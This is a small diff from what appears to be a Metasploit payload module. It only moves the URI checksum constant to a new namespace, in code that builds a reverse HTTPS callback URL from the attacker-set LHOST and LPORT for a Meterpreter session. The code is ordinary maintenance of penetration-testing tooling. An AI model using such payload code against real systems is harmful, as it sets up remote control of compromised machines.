@@ -37,7 +37,7 @@ module Metasploit3
   end
 
   def generate
-    checksum = generate_uri_checksum(Handler::ReverseHttp::UriChecksum::URI_CHECKSUM_CONN)
+    checksum = generate_uri_checksum(Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN)
     rand = Rex::Text.rand_text_alphanumeric(16)
     url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}/#{checksum}_#{rand}/"
 
